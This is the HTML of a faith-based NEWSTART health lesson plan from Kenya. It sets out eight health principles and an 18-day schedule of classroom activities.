      <p class="MsoNormal" style="text-align: justify"><span style="font-size: 10.0pt; font-family: Verdana">a)
      Respond by implementation of the eight principles in their daily lives by:</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">Nourishing
      their bodies with healthful, full-fiber, nutrient-rich foods</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">Practicing
      physical exercises at least 30minutes a day</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">Using
      various applications of water to relive pain and check disease.</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">Live a
      balanced life of work, play, rest, exercise and hobbies</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">Practice
      full, deep inhalations of pure air</span></p>
      <p class="MsoNormal" style="text-align: justify"><span style="font-size: 10.0pt; font-family: Verdana">b)
      Take the living principles of health reform into communities that to a
      large degree are ignorant of what they should do.&nbsp;</span></p>
      <ol style="margin-top: 0in; margin-bottom: 0in" start="1" type="1">
        <ol style="margin-top: 0in; margin-bottom: 0in" start="3" type="a">
          <li class="MsoNormal" style="text-align: justify"><font color="#008000"><u><span style="font-size: 10.0pt; font-family: Verdana">Attitude
            Objectives</span></u></font></li>
        </ol>
      </ol>
      <p class="MsoNormal" style="text-align: justify"><span style="font-size: 10.0pt; font-family: Verdana">As
      a result of this class, students will be better able to feel:</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">The
      need and importance of observing healthful living and habits</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">That
      through NEWSTART they can secure the highest possible development of mind
      and soul and body.</span></p>
      <p class="MsoNormal" style="text-indent: -.25in; margin-left: .5in" align="right"><a href="#Top"><font face="Verdana" size="1">Back to Top</font></A></p>
      <p class="MsoNormal" style="text-align: justify"><font size="2" color="#008000"><span style="font-family: Verdana; font-weight: 700">
      <a name="#Overview">Overview of Lesson:</a></span></font></p>
      <p class="MsoNormal" style="text-align: justify"><font size="2">
      <span style="font-family: Verdana; font-weight: 700">T</span><span style="font-family: Verdana">his 
      lesson has the intention of imparting knowledge in regards to the eight 
      laws of health, which are:</span></font></p>
      <p class="MsoNormal" style="text-align: justify">
      <font face="Verdana" size="2"><b><u>Nutrition</u></b><br>
      <br>
      Proper nutrition is the foundation of good health and recovery.<br>
      <br>
      <b><u>Exercise</u></b><br>
      <br>
      Action is a law of life. Muscle tone and strength are lost without 
      exertion, but exercise improves the health of body, mind, and spirit 
      increasing vitality and health. With today's sedentary lifestyle, we are 
      much more likely to rust out than to wear out.<br>
      <br>
      <br>
      <b><u>Water</u></b><br>
      <br>
      Because the body is 70% water, keeping well hydrated and knowing what and 
      when to drink are essential to health.<br>
      <br>
      <br>
      <b><u>Sunlight</u></b><br>
      <br>
      The sun is the established energy source ordained by God to sustain the 
      cycle of life for plants and animals.<br>
      <br>
      <br>
      <b><u>Temperance</u></b><br>
      <br>
      Using good things moderately and avoiding the bad is obviously wise, yet 
      often hard to practice. Temperance is a gift of God, a &quot;fruit of the 
      Spirit&quot; (Galatians 5:22, 23).<br>
      <br>
      <br>
      <b><u>Air</u><br>
      </b><br>
      Humans can live weeks without food, days without water, but only a few 
      minutes without air.<br>
      <br>
      <br>
      <b><u>Rest</u></b><br>
      <br>
      Your ability to work depends on your capacity to rest. Restoration 
      requires rest because sleep allows the body to renew itself.<br>
      <br>
      <br>
      <b><u>Trust</u></b><br>
      <br>
      The essence of trust is resting in the goodness of God. When trying to 
      sleep, a clear conscience is better than the softest pillow.</font></p>
      <p class="MsoNormal" style="text-indent: -.25in; margin-left: .5in" align="right">&nbsp;</p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><font size="2" color="#008000"><span style="font-family: Verdana; font-weight: 700">
      <a name="#Procedure">Procedure:</a></span></font></p>
      <table border="4" cellspacing="0" style="border-collapse: collapse" bordercolor="#00A800" width="99%" bordercolorlight="#008000" bordercolordark="#FFFF00" cellpadding="5" height="312">
        <tr>
          <td width="22%" bgcolor="#00A800" height="6"><font face="Verdana" size="2"><b>Day</b></font></td>
          <td width="19%" bgcolor="#00A800" height="6"><font face="Verdana" size="2"><b>Lesson</b></font></td>
          <td width="59%" bgcolor="#00A800" height="6"><font face="Verdana" size="2"><b>Activities</b></font></td>
        </tr>
        <tr>
          <td width="22%" height="32">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            1 and 2</font></td>
          <td width="19%" height="32">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="nutrition.htm"><b>N</b>utrition</a></font></td>
          <td width="59%" height="32">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity
            1: Vegetable Ragout</font></p>
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity
            2: Eating your way to health</font></td>
        </tr>
        <tr>
          <td width="22%" height="30">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            3 and 4</font></td>
          <td width="19%" height="30">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="exercise.htm"><b>E</b>xercise</a></font></td>
          <td width="59%" height="30">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity
            1: Staying fit and healthy</font></p>
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity
            2: </font><span style="font-size: 10.0pt; font-family: Verdana">10-Step
            Exercise Program</span></td>
        </tr>
        <tr>
          <td width="22%" height="32">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            5 and 6</font></td>
          <td width="19%" height="32">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="water.htm"><b>W</b>ater</a></font></td>
          <td width="59%" height="32">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity
            1: </font><span style="font-size: 10.0pt; font-family: Verdana">What
            do they view as a drink?</span></p>
            <p style="margin-top: 0; margin-bottom: 0"><font size="2"><span style="font-family: Verdana">Activity
            2: </span></font><span style="font-size: 10.0pt; font-family: Verdana">Water
            vs. Soft Drinks</span></td>
        </tr>
        <tr>
          <td width="22%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            7 and 8</font></td>
          <td width="19%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="sunlight.htm"><b>S</b>unshine</a></font></td>
          <td width="59%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity:
            Sunlight Quiz</font></td>
        </tr>
        <tr>
          <td width="22%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            9 and 10</font></td>
          <td width="19%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="temperance.htm"><b>T</b>emperance</a></font></td>
          <td width="59%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity:
            </font><span style="font-size: 10.0pt; font-family: Verdana">Susan’
            s Scenario</span></td>
        </tr>
        <tr>
          <td width="22%" height="48">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            11 and 12</font></td>
          <td width="19%" height="48">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="air.htm"><b>A</b>ir</a></font></td>
          <td width="59%" height="48">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity
            1: </font><span style="font-size: 10.0pt; font-family: Verdana">Practice
            deep, systematic breathing</span></p>
            <p style="margin-top: 0; margin-bottom: 0"><font size="2"><span style="font-family: Verdana">Activity
            2: </span></font><span style="font-family: Verdana"><font size="2">Caught
            in the Act!</font></span></td>
        </tr>
        <tr>
          <td width="22%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            13 and 14</font></td>
          <td width="19%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="rest.htm"><b>R</b>est</a></font></td>
          <td width="59%" height="16">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity
            1: Sleep Quiz</font></td>
        </tr>
        <tr>
          <td width="22%" height="48">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            15 and 16</font></td>
          <td width="19%" height="48">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="trustinGod.htm"><b>T</b>rust
            in God</a></font></td>
          <td width="59%" height="48">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Activity
            1: </font><span style="font-size: 10.0pt; font-family: Verdana">Count
            your blessings!</span></p>
            <p style="margin-top: 0; margin-bottom: 0"><font size="2"><span style="font-family: Verdana">Activity
            2: Sing, Pray, Memorize and Meditate</span></font></td>
        </tr>
        <tr>
          <td width="22%" height="19">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2">Day
            17 and 18</font></td>
          <td width="19%" height="19">
            <p style="margin-top: 0; margin-bottom: 0"><font face="Verdana" size="2"><a href="Review.htm">review</a></font></td>
          <td width="59%" height="19">
            <p style="margin-top: 0; margin-bottom: 0">&nbsp;</td>
        </tr>
      </table>
      <p class="MsoNormal" align="right"><a href="#Top"><font face="Verdana" size="1">Back to Top</font></A></p>
    </td>
  </tr>
  <tr>
    <td width="100%" colspan="2" height="1" bgcolor="#99E8B5">
      <hr color="#008000">
      <p align="center" style="line-height: 100%; word-spacing: 0; margin-left: 0; margin-top: 0; margin-bottom: 0"><i><font face="Book Antiqua" size="1">ITC
      Programme</font></i></p>
      <p align="center" style="line-height: 100%; word-spacing: 0; margin-left: 0; margin-top: 0; margin-bottom: 0"><i><font face="Book Antiqua" size="1">NEWSTART
      Lesson Plan</font></i></p>
      <p align="center" style="line-height: 100%; word-spacing: 0; margin-left: 0; margin-top: 0; margin-bottom: 0"><i><font face="Book Antiqua" size="1">Janet
      Oyende</font></i></p>
      <p align="center" style="line-height: 100%; word-spacing: 0; margin-left: 0; margin-top: 0; margin-bottom: 0"><i><font face="Book Antiqua" size="1">P.O.
      Box 20940 - 00202 Nairobi, Kenya</font></i></p>
      <p align="center" style="line-height: 100%; word-spacing: 0; margin-left: 0; margin-top: 0; margin-bottom: 0"><i><font face="Book Antiqua" size="1">Email
      Address: <a href="mailto:jtoyende@yahoo.com">jtoyende@yahoo.com</a> </font></i></td>
  </tr>
</table>
</body>
</html>
